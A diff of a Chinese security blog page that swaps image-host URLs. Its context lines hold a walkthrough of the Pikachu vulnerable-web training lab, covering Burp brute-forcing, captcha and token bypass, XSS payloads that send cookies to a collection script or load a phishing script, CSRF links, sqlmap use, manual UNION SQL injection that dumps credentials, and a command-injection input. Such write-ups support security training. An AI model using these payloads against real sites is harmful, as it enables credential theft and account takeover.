@@ -257,7 +257,7 @@ var _hmt = _hmt || [];
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://img3.imgtp.com/2022/04/17/625c232ee0b21.jpeg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220512174256.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -471,15 +471,15 @@ var _hmt = _hmt || [];
 <p>所以直接用<code>intruder</code>模块加载字典爆破</p>
 <p><strong>intruder中的四种模式：</strong></p>
 <ul>
-<li>Sniper<br>每次发包只能修改一次选定的参数<br><img src="https://img1.imgtp.com/2022/04/08/624f92df1c34c.png"></li>
-<li>Battering ram<br>选定的参数在每次发包时同时修改<br><img src="https://img1.imgtp.com/2022/04/08/624f92dea17ca.png"></li>
+<li>Sniper<br>每次发包只能修改一次选定的参数<br><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526152754.png"></li>
+<li>Battering ram<br>选定的参数在每次发包时同时修改<br><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526152859.png"></li>
 </ul>
 <ul>
-<li>Pitchfork<br>要配置两段字典，字典按行数一一对应，超出的部分忽略不加载<br><img src="https://img1.imgtp.com/2022/04/08/624f92de5c705.png"></li>
-<li>Cluster bomb<br>以排列组合的方式<br><img src="https://img1.imgtp.com/2022/04/08/624f92df38875.png"></li>
+<li>Pitchfork<br>要配置两段字典，字典按行数一一对应，超出的部分忽略不加载<br><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526153617.png"></li>
+<li>Cluster bomb<br>以排列组合的方式<br><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526153701.png"></li>
 </ul>
 <p>最后选择可以根据长度来判断是否登录成功</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624f94372b96d.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526153726.png"></p>
 <h3 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h3><p>验证码可以重复使用</p>
 <p>源码中的注释也写的比较清楚了，在生成验证码的<code>showvcode.php</code>文件只做了<code>session_start</code>，所有生成的验证码在该<code>session</code>中能一直使用，这也就造成了我们再重复发包的时候可以一直利用同一个验证码</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//验证验证码是否正确</span>
@@ -515,14 +515,14 @@ var _hmt = _hmt || [];
 <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>和前面的方法一样，直接抓包放到<code>intruder</code>中爆破就好了</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624f9436d656a.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526154445.png"></p>
 <h3 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h3><p>删除前端生成函数</p>
 <p>可以直接在前端源码中查看到定义的js代码</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624f9437262f7.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526154734.png"></p>
 <p>直接删除前端的生成的验证码函数，绕过前端的验证码生成</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624f9436b6ea7.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526155117.png"></p>
 <p>在抓取到包后就可以直接放入到<code>intruder</code>中爆破</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624f95831db75.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526155147.png"></p>
 <h3 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破?"></a>token防爆破?</h3><p>每当一个新的session生成时就会生成一个新的随机token</p>
 <p>在验证账号密码的同时，还会验证当前提交的token和生成的token是否一致</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$token</span> <span class="token operator">==</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
@@ -532,24 +532,24 @@ var _hmt = _hmt || [];
             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$line_pre</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                 <span class="token variable">$html</span><span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;p> login success&lt;/p>'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>但是生成的随机token是可以在前端源代码中查看的<br><img src="https://img1.imgtp.com/2022/04/08/624f96c7078b5.png"></p>
+<p>但是生成的随机token是可以在前端源代码中查看的<br><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526155337.png"></p>
 <p>这就导致，在同一个session，我们可以抓取当前页面的token值，再同时提交账号密码和token来进行爆破</p>
 <p>可以利用<code>burpsuite</code>或<code>python</code>脚本来做爆破</p>
 <p><strong>burpsuite</strong></p>
 <p>抓包放到<code>intruder</code>模块中，在<code>options</code>中找到<code>Grep-Extract</code>选项，点击<code>Add</code></p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624f982dc4bb7.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526155454.png"></p>
 <p>点击<code>Refetch response</code>获取响应包，鼠标选中token值，bp会自动帮我们设置正则匹配的语句</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624f98f9566a2.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526155622.png"></p>
 <p>选择OK，再在当前的<code>options</code>中找到<code>Redirections</code>，把<code>Follow redirections</code>选择为Always</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624f9973420b4.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526155707.png"></p>
 <p>来到选定框中，选定要加载的参数，记住要是<strong>Pitchfork</strong>模式</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624f9c33098b4.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526155809.png"></p>
 <p>选定token要加载的payload为<code>Recursive grep</code></p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624f9a7153b93.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526155853.png"></p>
 <p>最后将线程（Number of threads）修改为1，保证一个session对应一个token</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624f9cd040c29.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526155916.png"></p>
 <p>开始爆破</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624f9d0a1a608.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526155956.png"></p>
 <p><strong>python</strong></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding:utf-8</span>
 <span class="token keyword">import</span> requests
@@ -589,9 +589,9 @@ token <span class="token operator">=</span> BeautifulSoup<span class="token punc
 <pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>在插入代码前，前端代码有限制输入框的字数限制，先修改前端代码，突破字数限制，也可以直接在url中插入js代码</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624fa18c2b95f.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526160130.png"></p>
 <p>将上面的js代码插入到输入框中，可以看到有弹窗出现</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624fa1c6453d9.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526160200.png"></p>
 <p><strong>*注</strong>：弹框只是直观的检测是否存在xss漏洞的输入点</p>
 <p><strong>我们看看源码</strong></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'kobe'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
@@ -605,9 +605,9 @@ token <span class="token operator">=</span> BeautifulSoup<span class="token punc
 
 <p>首先登录 admin/123456 </p>
 <p>来到输入框继续插入上面的js代码，得到和上面一样的结果</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624fa1c6453d9.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526160330.png"></p>
 <p>在hackbar插件中，我们可以看到加载出来的js代码在POST Data中</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624fa69608253.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526160406.png"></p>
 <p><strong>源码</strong></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'kobe'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
     <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;p class='notice'>愿你和<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>一样，永远年轻，永远热血沸腾！&lt;/p>&lt;img src='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$PIKA_ROOT_DIR</span><span class="token punctuation">&#125;</span></span>assets/images/nbaplayer/kobe.png' />"</span><span class="token punctuation">;</span>
@@ -619,9 +619,9 @@ token <span class="token operator">=</span> BeautifulSoup<span class="token punc
 <pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>直接将js代码插入到留言框中，可以看到js代码已经存储到服务端了</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624fab3028cbf.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526160516.png"></p>
 <p>每次点击该页面都会执行插入的js代码</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624fab670d4e0.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526160516.png"></p>
 <p><strong>源码</strong></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">//将message信息插入到数据库中
 if(array_key_exists("message",$_POST) &amp;&amp; $_POST['message']!=null)&#123;
@@ -673,11 +673,11 @@ if(array_key_exists("message",$_POST) &amp;&amp; $_POST['message']!=null)&#123;
 &lt;script&gt;document.location &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu&#x2F;pkxss&#x2F;xcookie&#x2F;cookie.php?cookie&#x3D;&#39; + document.cookie;&lt;&#x2F;script&gt;	&#x2F;&#x2F;盗取cookie
 &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu&#x2F;pkxss&#x2F;xfish&#x2F;fish.php&quot;&gt;&lt;&#x2F;script&gt;	&#x2F;&#x2F;账号密码钓鱼<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://img1.imgtp.com/2022/04/08/624fc715aa5cc.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526161129.png"></p>
 <p>管理员登录后台</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624fc75bc7a14.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526160716.png"></p>
 <p>xss后台成功获取cookie信息</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624fc79c75689.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526161041.png"></p>
 <p><strong>源码</strong></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"content"</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
     <span class="token variable">$content</span><span class="token operator">=</span><span class="token function">escape</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -793,15 +793,14 @@ if(isset($_GET['submit']) &amp;&amp; $_GET['message'] !=null)&#123;
 <h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h3><pre class="line-numbers language-url" data-language="url"><code class="language-url">http:&#x2F;&#x2F;localhost&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;girl&amp;phonenum&#x3D;12344556789&amp;add&#x3D;qwe&amp;email&#x3D;12344556789@qq.com&amp;submit&#x3D;submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>让kobe用户去点击上面的连接，kobe用户原本的信息</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624fd3a77b183.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526165402.png"></p>
 <p>在点击完连接后可以看到kobe的个人信息被修改为lucy的了</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624fd420b437b.png"></p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624fd45118bd6.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526165434.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526165452.png"></p>
 <h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><p>利用burp生成csrf poc</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624fd5d605c8b.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526170015.png"></p>
 <p>可以copy下来生成的poc，再让受害者点击存放poc的网址</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624fd6c3afcc6.png"></p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624fd6c42bdda.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526170054.png"></p>
 <p>kobe的个人信息再一次被修改为lucy的</p>
 <h3 id="CSRF-token"><a href="#CSRF-token" class="headerlink" title="CSRF(token)"></a>CSRF(token)</h3><p>跟前面比较，这里多了一个Token，如果后台对提交的Token进行了验证，由于Token是随机的，我们就无法伪造URL了</p>
 <p><strong>源码</strong></p>
@@ -827,11 +826,11 @@ $ sqlmap -u <span class="token string">"http://localhost/pikachu/vul/sqli/sqli_i
 //获取shell（必须知道网站绝对路径）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h4 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h4><p>利用hackbar插件（这里最好使用chrome中的插件），在发送post请求的id中加上’，网页返回报错信息，判断存在sql注入</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624fdcd6cf7f4.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526170201.png"></p>
 <p>根据回显信息，判断为数字型注入，构造闭合，插入<code>order by</code>语句来判断字段数，在字段数为3的时候报错，说明字段数为2</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624fdddfe7879.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526170330.png"></p>
 <p>判断回显点，用联合查询语句，union select，记住<code>id=</code>的数必须是一个错误的数，这样数据库执行后面联合查询语句的信息才能回显在页面上</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624fdebb7efc7.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526170440.png"></p>
 <p>之后我们就可以插入一些函数或sql语句来查询数据库了</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>	<span class="token comment">//查询当前数据库名称</span>
 id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>		<span class="token comment">//查询当前数据库版本</span>
@@ -843,7 +842,7 @@ id<span class="token operator">=</span><span class="token operator">-</span><spa
 
 id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>	<span class="token comment">//查询表中的账号和密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://img1.imgtp.com/2022/04/08/624fe1e816713.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526170542.png"></p>
 <h3 id="字符型注入-get"><a href="#字符型注入-get" class="headerlink" title="字符型注入(get)"></a>字符型注入(get)</h3><h4 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a><strong>源码</strong></h4><p>这里修改了请求方式，和注入类型</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token comment">//这里的变量是字符型，需要考虑闭合</span>
@@ -854,7 +853,7 @@ id<span class="token operator">=</span><span class="token operator">-</span><spa
 //检测是否存在注入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <h4 id="手工注入-1"><a href="#手工注入-1" class="headerlink" title="手工注入"></a>手工注入</h4><p>判断注入类型</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624fe73a8800e.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526170733.png"></p>
 <p>在url中直接添加sql语句</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">name<span class="token operator">=</span><span class="token number">1</span><span class="token string">'%23	//语句闭合
 
@@ -865,7 +864,7 @@ name<span class="token operator">=</span><span class="token operator">-</span><s
 name=-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>	<span class="token comment">//查询当前表字段信息</span>
 name<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>	<span class="token comment">//查询账号密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://img1.imgtp.com/2022/04/08/624fe973d9e74.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526171207.png"></p>
 <h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><h4 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a><strong>源码</strong></h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//这里没有做任何处理，直接拼到select里面去了</span>
 <span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
@@ -876,7 +875,7 @@ name<span class="token operator">=</span><span class="token operator">-</span><s
 //检测是否存在注入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <h4 id="手工注入-2"><a href="#手工注入-2" class="headerlink" title="手工注入"></a>手工注入</h4><p>只需要根据特定的语句做拼接闭合就好了，首先判断注入类型，%在sql语句中表示模糊匹配，由此判断是搜索型注入</p>
-<p><img src="https://img1.imgtp.com/2022/04/08/624febb4e8c81.png"></p>
+<p><img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220526171257.png"></p>
 <p>找到注入点后就先尝试闭合，再插入其他sql语句，可以看到这里列举出了所有用户信息</p>
 <p><img src="https://s2.loli.net/2022/04/08/HGay2PjqgXYkESt.png"></p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">name<span class="token operator">=</span><span class="token operator">%</span><span class="token string">'order by 3--+	//判断字段数
@@ -1822,7 +1821,7 @@ a<span class="token punctuation">;</span><span class="token function">whoami</sp
                 <a href="/2022/04/07/web-lou-dong-zhi-zai-tan-pikachu/">
                     <div class="card-image">
                         
-                        <img src="https://img3.imgtp.com/2022/04/17/625c232ee0b21.jpeg" class="responsive-img" alt="web漏洞之再探pikachu">
+                        <img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220512174256.png" class="responsive-img" alt="web漏洞之再探pikachu">
                         
                         <span class="card-title">web漏洞之再探pikachu</span>
                     </div>
@@ -1875,7 +1874,7 @@ a<span class="token punctuation">;</span><span class="token function">whoami</sp
                 <a href="/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">
                     <div class="card-image">
                         
-                        <img src="https://imgtp.apqiang.com/2022/04/03/8zyfbYja.jpeg" class="responsive-img" alt="ctf-nodejs之一些小知识">
+                        <img src="https://f1ve-picgogogo.oss-cn-hangzhou.aliyuncs.com/img/20220525173823.png" class="responsive-img" alt="ctf-nodejs之一些小知识">
                         
                         <span class="card-title">ctf-nodejs之一些小知识</span>
                     </div>
